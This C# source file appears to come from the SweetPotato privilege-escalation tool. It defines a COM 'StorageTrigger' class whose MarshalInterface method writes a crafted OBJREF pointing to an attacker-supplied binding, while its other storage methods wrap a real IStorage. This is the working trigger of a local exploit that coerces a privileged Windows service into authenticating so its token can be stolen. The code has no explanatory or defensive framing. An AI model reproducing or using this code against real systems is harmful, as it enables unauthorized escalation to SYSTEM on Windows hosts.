using System;
using System.Runtime.InteropServices;

namespace SweetPotato {

    [ComVisible(true)]
    internal class StorageTrigger : IMarshal, IStorage {

        private IStorage storage;
        private string binding;
        private TowerProtocol towerProtocol;

        public StorageTrigger(IStorage storage, string binding, TowerProtocol towerProtocol) {
            this.storage = storage;
            this.binding = binding;
            this.towerProtocol = towerProtocol;
        }

        public void DisconnectObject(uint dwReserved) {
        }

        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize) {
            pSize = 1024;
        }

        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid) {
            pCid = new Guid("00000306-0000-0000-c000-000000000046");
        }

        public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS) {

            ObjRef objRef = new ObjRef(Ole32.IID_IUnknown,
                  new ObjRef.Standard(0x1000, 1, 0x0703d84a06ec96cc, 0x539d029cce31ac, new Guid("{042c939f-54cd-efd4-4bbd-1c3bae972145}"),
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));

            uint written;
            byte[] data = objRef.GetBytes();
            pstm.Write(data, (uint)data.Length, out written);
        }

        public void ReleaseMarshalData(IStream pstm) {
        }

        public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv) {
            ppv = IntPtr.Zero;
        }

        public void Commit(uint grfCommitFlags) {
            storage.Commit(grfCommitFlags);
        }

        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest) {
            storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
        }

        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg) {
            storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
        }

        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm) {
            storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
        }

        public void DestroyElement(string pwcsName) {
            storage.DestroyElement(pwcsName);
        }

        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum) {
            storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
        }

        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags) {
            storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
        }

        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg) {
            storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
        }

        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm) {
            storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
        }

        public void RenameElement(string pwcsOldName, string pwcsNewName) {

        }

        public void Revert() {

        }

        public void SetClass(ref Guid clsid) {

        }

        public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime) {

        }

        public void SetStateBits(uint grfStateBits, uint grfMask) {
        }

        public void Stat(STATSTG[] pstatstg, uint grfStatFlag) {
            storage.Stat(pstatstg, grfStatFlag);
            pstatstg[0].pwcsName = "hello.stg";
        }
    }
}
